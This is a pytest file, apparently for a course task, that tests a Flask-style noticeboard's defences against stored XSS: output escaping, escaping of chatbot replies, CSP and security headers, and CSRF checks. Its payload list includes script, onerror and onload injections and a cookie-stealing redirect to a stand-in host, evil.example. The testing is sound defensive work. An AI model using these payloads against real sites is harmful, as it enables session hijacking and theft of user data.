"""Task A.4.2 - cross-site scripting.

The noticeboard stores what users type and shows it to everyone else, so it
is the natural place for stored XSS. The defence is output encoding at
render time (Jinja2 autoescape), plus a CSP that would block inline scripts
even if something slipped through.
"""
import re

from tests.conftest import csrf_from

PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=\"alert(1)\">",
    "<svg/onload=alert(1)>",
    "\"><script>document.location='https://evil.example/?c='+document.cookie</script>",
    "javascript:alert(1)",
]


def _post_via_page(client, body):
    token = csrf_from(client.get("/board").data)
    return client.post("/board", data={"csrf_token": token, "body": body})


def test_script_in_message_is_escaped_not_executed(client, make_user, page_login):
    make_user("alice@example.com")
    page_login("alice@example.com")
    for payload in PAYLOADS:
        assert _post_via_page(client, payload).status_code == 302
    html = client.get("/board").data.decode()
    # no real tag survives; the text is still there, but as inert &lt;...&gt; entities
    assert re.search(r"<(script|img|svg)\b", html) is None
    assert "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;" in html
    assert "&lt;img src=x onerror=&#34;alert(1)&#34;&gt;" in html


def test_payload_is_stored_verbatim_but_json_api_is_not_a_html_context(client, patient):
    payload = "<script>alert(1)</script>"
    resp = client.post("/api/messages", headers=patient["headers"], json={"body": payload})
    assert resp.status_code == 201
    listing = client.get("/api/messages", headers=patient["headers"])
    assert listing.mimetype == "application/json"           # browsers never render this as a page
    assert listing.get_json()[0]["body"] == payload         # stored as typed, escaped where rendered
    assert listing.headers["X-Content-Type-Options"] == "nosniff"


def test_author_name_is_escaped_too(client, make_user, page_login):
    make_user("eve@example.com", full_name="<b onmouseover=alert(1)>Eve</b>")
    page_login("eve@example.com")
    _post_via_page(client, "hello")
    html = client.get("/board").data.decode()
    assert "<b onmouseover" not in html and "&lt;b onmouseover=alert(1)&gt;Eve&lt;/b&gt;" in html


def test_chatbot_reply_is_escaped_on_the_html_page(client, app, make_user, page_login):
    class EvilModel:
        def chat(self, messages, **kw):
            return "Sure: <img src=x onerror=alert('pwned')>"
    app.extensions["cerebras"] = EvilModel()
    make_user("alice@example.com")
    page_login("alice@example.com")
    token = csrf_from(client.get("/chat").data)
    html = client.post("/chat", data={"csrf_token": token, "message": "hi"}).data.decode()
    assert "<img src=x" not in html and "&lt;img src=x onerror=alert(&#39;pwned&#39;)&gt;" in html


def test_security_headers_are_set_on_every_response(client):
    for path in ("/", "/login", "/api/auth/me"):
        resp = client.get(path)
        csp = resp.headers["Content-Security-Policy"]
        assert "default-src 'self'" in csp and "object-src 'none'" in csp and "frame-ancestors 'none'" in csp
        assert resp.headers["X-Content-Type-Options"] == "nosniff"
        assert resp.headers["X-Frame-Options"] == "DENY"
        assert resp.headers["Referrer-Policy"] == "no-referrer"


def test_forms_reject_missing_or_wrong_csrf_token(client, make_user, page_login):
    make_user("alice@example.com")
    page_login("alice@example.com")
    assert client.post("/board", data={"body": "no token"}).status_code == 400
    assert client.post("/board", data={"body": "bad token", "csrf_token": "guess"}).status_code == 400
    assert "no token" not in client.get("/board").data.decode()
